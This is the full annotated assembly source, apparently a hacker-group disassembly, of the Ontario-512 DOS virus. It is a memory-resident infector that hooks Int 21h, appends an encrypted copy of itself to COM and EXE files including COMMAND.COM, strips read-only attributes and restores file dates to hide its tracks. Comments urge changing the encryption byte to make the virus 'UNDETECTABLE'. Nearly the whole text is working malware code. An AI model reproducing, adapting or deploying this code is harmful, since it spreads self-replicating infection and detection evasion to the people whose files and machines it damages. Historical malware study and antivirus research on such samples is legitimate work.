;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-* 
;-*                        Ontario-512 Virus                          *- 
;*-                       ~~~~~~~~~~~~~~~~~~~                         -* 
;-*  Disassmembly by: Rock Steady/NuKE                                *- 
;*-  ~~~~~~~~~~~~~~~~                                                 -* 
;-*  Notes: Resident EXE and COM infector, will infect COMMAND.COM    *- 
;*-  ~~~~~~ on execution. 512 bytes file increase, memory decrease    -* 
;-*         of about 2,048 bytes. Anti-debugging, encrypted virus.    *- 
;*-                                                                   -* 
;-* (c) Copy-Ya-Rite [NuKE] Viral Development Labs '92                *- 
;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-* 
virus       segment byte public                                          
            assume  cs:virus, ds:virus                                   
                                                                         
            org     100h                    ;Guess its a COM File huh?   
ont         proc    far                                                  
                                                                         
start:                                                                   
            jmp     go4it                   ;Jump to beginning of the    
            db      1Dh                     ;Virus And start!            
            db      'fected [NuKE]''92', 0Dh, 0Ah, '$'                   
            mov     dx,0102h        ;This is the small File the Virus    
            mov     ah,09h          ;is infected to! As you see it only  
            int     21h             ;displays that messages and exits    
            int     20h             ;Exit Command for COMs               
go4it:                                                                   
            nop                                                          
            call    decrypt         ;Get Decryption value & Decrypt viri 
            call    virus_start     ;Start the Virus!                    
ont         endp                                                         
                                                                         
;---------------------------------------------------------------------;  
;                   The Start of the Virus Code                       ;  
;---------------------------------------------------------------------;  
                                                                         
virus_start           proc    near                                       
            pop     bp                                                   
            sub     bp,7                                                 
            mov     ax,0FFFFh             ;Is Virus in Memory hooked on? 
            int     21h                     ;the Int 21h?                
            or      ah,ah                   ;                            
            jz      bye_bye                 ;Yes it is... Quit then...   
            push    ds                                                   
            xor     ax,ax                                                
            mov     ds,ax                                                
            sub     word ptr ds:413h,2                                   
            lds     bx,dword ptr ds:84h                                  
            mov     word ptr cs:[200h][bp],bx                            
            mov     word ptr cs:[202h][bp],ds                            
            mov     bx,es                                                
            dec     bx                                                   
            mov     ds,bx                                                
            sub     word ptr ds:3,80h                                    
            mov     ax,ds:12h                                            
            sub     ax,80h                                               
            mov     ds:12h,ax                                            
            mov     es,ax                                                
            push    cs                                                   
            pop     ds                                                   
            mov     si,bp                                                
            xor     di,di                                                
            mov     cx,204h                                              
            cld                                                          
            rep     movsb                                                
            mov     ds,cx                                                
            cli                             ;This is where we hook the   
            mov     word ptr ds:84h,7Fh     ;virus to the Int21h         
            mov     word ptr ds:84h+2,ax                                 
            sti                                                          
            mov     ax,4BFFh                                             
            int     21h                                                  
            pop     ds                                                   
            push    ds                                                   
            pop     es                                                   
bye_bye:                                                                 
            or      bp,bp                                                
            jz      what                                                 
            lea     si,[bp+7Bh]                                          
            nop                                                          
            mov     di,offset ds:[100h]                                  
            push    di                                                   
            cld                                                          
            movsw                                                        
            movsw                                                        
            retn                                                         
what:                                                                    
            mov     ax,es                                                
            add     cs:7dh,ax                                            
;*          jmp     far ptr go4it7                                       
virus_start           endp                                               
            db      0EAh,0EBh, 15h, 49h, 6Eh                             
            cmp     ax,0FFFFh                                            
            jne     new_21h                                              
            inc     ax                                                   
            iret                                                         
;---------------------------------------------------------------------;  
;                     Interrupt 21h handler                           ;  
;---------------------------------------------------------------------;  
new_21h:                                                                 
           cmp     ah,4Bh        ;Test, is File beginning Executed!      
           jne     leave_ok      ;Nope! Call Int21!                      
           cmp     al,3          ;Overlay, beginning execute?            
           je      leave_ok      ;Yes! Leave it alone                    
           cmp     al,0FFh       ;Virus testing to see if its alive?     
           jne     do_it_man     ;in memory?                             
           push    cs                                                    
           pop     ds                                                    
           mov     dx,1DDh                                               
           call    infect                                                
           iret                                                          
do_it_man:                                                               
           call    infect       ;Infect file dude...                     
leave_ok:                                                                
           jmp     dword ptr cs:[200h]  ;Int21 handler..                 
                                                                         
;---------------------------------------------------------------------;  
;              Infection Routine for the Ontario Virus                ;  
;---------------------------------------------------------------------;  
                                                                         
infect     proc    near                                                  
           push    es                                                    
           push    ds              ;Save them not to fuck things up..    
           push    dx                                                    
           push    cx                                                    
           push    bx                                                    
           push    ax                                                    
           mov     ax,4300h        ;Here we get the file attribute       
           call    int21           ;for file to be infected.             
           jc      outta           ;Bitch Error encountered. Quit!       
           test    cl,1            ;Test if its Read-Only!               
           jz      attrib_ok       ;Ok, it ain't Read-Only Continue!     
           and     cl,0FEh         ;Set Read-Only to normal Attribs      
           mov     ax,4301h        ;Call Ints to do it...                
           call    int21           ;Bingo! Done!                         
           jc      outta           ;Error encountered? Split if yes!     
attrib_ok:                                                               
           mov     ax,3D02h        ;Open file for Read/Write             
           call    int21           ;Call Interrupt to do it!             
           jnc     open_ok         ;no errors? Continue!                 
outta:                                                                   
           jmp     go4it5          ;Hey, Split Man... Errors happened!   
open_ok:                                                                 
           mov     bx,ax           ;BX=File Handle                       
           push    cs                                                    
           pop     ds                                                    
           mov     ax,5700h        ;Get File's Date & Time               
           call    int21           ;Do it!                               
           mov     word ptr ds:[204h],cx  ;Save Time                     
           mov     word ptr ds:[206h],dx  ;Save Date                     
           mov     dx,208h         ;DX=Pointer                           
           mov     cx,1Bh          ;CX=Number of Btyes                   
           mov     ah,3Fh          ;Read From File                       
           call    int21           ;Do It!                               
           jc      go4it1          ;Errors? Quit if yes!                 
           cmp     word ptr ds:[208h],5A4Dh ;Check if files already      
           je      go4it0                   ;infected.                   
           mov     al,byte ptr ds:[209h]   ;Com , Exes...                
           cmp     al,byte ptr ds:[20Bh]                                 
           je      go4it1                                                
           xor     dx,dx                                                 
           xor     cx,cx                                                 
           mov     ax,4202h                                              
           call    int21           ;Move File pointer to end of          
           jc      go4it1          ;file to be infected.                 
           cmp     ax,0E000h       ;File bigger than E000 bytes?         
           ja      go4it1          ;Error...                             
           push    ax              ;Save File Length                     
           mov     ax,word ptr ds:[208h]                                 
           mov     ds:7bh,ax                                             
           mov     ax,word ptr ds:[20Ah]                                 
           mov     ds:7dh,ax                                             
           pop     ax                       ;All this is, is a complex   
           sub     ax,3                     ;way to do "JMP"             
           mov     byte ptr ds:[208h],0E9h  ;                            
           mov     word ptr ds:[209h],ax                                 
           mov     byte ptr ds:[20Bh],al                                 
           jmp     short go4it3             ;File READY Infect it!       
           db      90h                      ;NOP me... detection string? 
go4it0:                                                                  
           cmp     word ptr ds:[21Ch],1                                  
           jne     go4it2                                                
go4it1:                                                                  
           jmp     go4it4                                                
go4it2:                                                                  
           mov     ax,word ptr ds:[20Ch]                                 
           mov     cx,200h                                               
           mul     cx                                                    
           push    ax                                                    
           push    dx                                                    
           mov     cl,4                                                  
           ror     dx,cl                                                 
           shr     ax,cl                                                 
           add     ax,dx                                                 
           sub     ax,word ptr ds:[210h]                                 
           push    ax                                                    
           mov     ax,word ptr ds:[21Ch]                                 
           mov     ds:7bh,ax                                             
           mov     ax,word ptr ds:[21Eh]                                 
           add     ax,10h                                                
           mov     ds:7dh,ax                                             
           pop     ax                      ; This is continues with the  
           mov     word ptr ds:[21Eh],ax   ; above to put a JMP at the   
           mov     word ptr ds:[21Ch],1    ; beginning of the file!      
           inc     word ptr ds:[20Ch]      ;                             
           pop     cx                      ;                             
           pop     dx                      ;                             
           mov     ax,4200h                ;                             
           call    int21                                                 
           jc      go4it4                                                
go4it3:                                                                  
           xor     byte ptr ds:[1F8h],8   ;                              
           xor     ax,ax                  ; Theses Lines copy the        
           mov     ds,ax                  ; virus code else where        
           mov     al,ds:46Ch             ; in memory to get it          
           push    cs                     ; ready to infect the file     
           pop     ds                     ; as we must encrypt it        
           push    cs                     ; FIRST when we infect the     
           pop     es                     ; file. so we'll encrypt       
           mov     byte ptr ds:[1ECh],al  ; this copy we're making!      
           xor     si,si                  ; and append that to the       
           mov     di,offset ds:[224h]    ; end of the file              
           push    di                     ;                              
           mov     cx,200h                ;                              
           cld                            ;                              
           rep     movsb                                                 
           mov     si,offset ds:[228h]    ;Now Encrpyt that copy of the  
           call    encrypt_decrypt        ;virus we just made...         
           pop     dx                                                    
           mov     cx,200h                ;Write Virus to file!          
           mov     ah,40h                 ;BX=Handle, CX=Bytes           
           call    int21                  ;DX=pointer to write buffer    
           jc      go4it4            ;Duh? Check for errors!             
           xor     cx,cx                                                 
           xor     dx,dx                  ;Now move pointer to beginning 
           mov     ax,4200h               ;of file.                      
           call    int21                                                 
           jc      go4it4            ;Duh? Check for errors!             
           mov     dx,208h                ;Write to file!                
           mov     cx,1Bh                 ;CX=Bytes                      
           mov     ah,40h                 ;DX=pointes to buffer          
           call    int21             ;Bah, HumBug                        
go4it4:                                                                  
           mov     dx,word ptr ds:[206h]  ;Leave no tracks...            
           mov     cx,word ptr ds:[204h]  ; puts back File TIME          
           mov     ax,5701h               ; and DATE! on file...         
           call    int21                  ;                              
           mov     ah,3Eh                 ;                              
           call    int21             ;Bah, HumBug...                     
go4it5:                                                                  
           pop     ax                     ;Get lost...                   
           pop     bx                                                    
           pop     cx                                                    
           pop     dx                                                    
           pop     ds                                                    
           pop     es                                                    
           retn                                                          
infect     endp                                                          
                                                                         
;----------------------------------------------------------------------; 
;                 The Original Interrupt 21h handler                   ; 
;----------------------------------------------------------------------; 
                                                                         
int21      proc    near                                                  
           pushf                       ;Fake an Int Call...              
                                                                         
           call    dword ptr cs:[200h] ;Orignal Int21h Handler           
           retn                                                          
int21      endp                                                          
                                                                         
           db      'C:\COMMAND.COM'                                      
           db       00h, 84h                                             
                                                                         
;---------------------------------------------------------------------;  
;            The Simple, But VERY Effective Encryption Routine        ;  
;---------------------------------------------------------------------;  
                                                                         
decrypt    proc    near                                                  
           pop     si                                                    
           push    si                                                    
           mov     al,byte ptr cs:[1E8h][si];INCRYPTION VALUE TO CHANGE! 
encrypt_decrypt:                         ;and Virus will be UNDETECTABLE 
           mov     cx,1E8h            ; LENGTH OF VIRII! Change this!    
loop_me:   not     al                 ; if you modief the virus!         
           xor     cs:[si],al         ;                                  
           inc     si                 ;                                  
           loop    loop_me            ;                                  
                                      ;                                  
           retn                                                          
decrypt    endp                                                          
                                                                         
                                                                         
virus      ends                                                          
           end     start                                                 
                                                                         
;------------------------------------------------------------------------

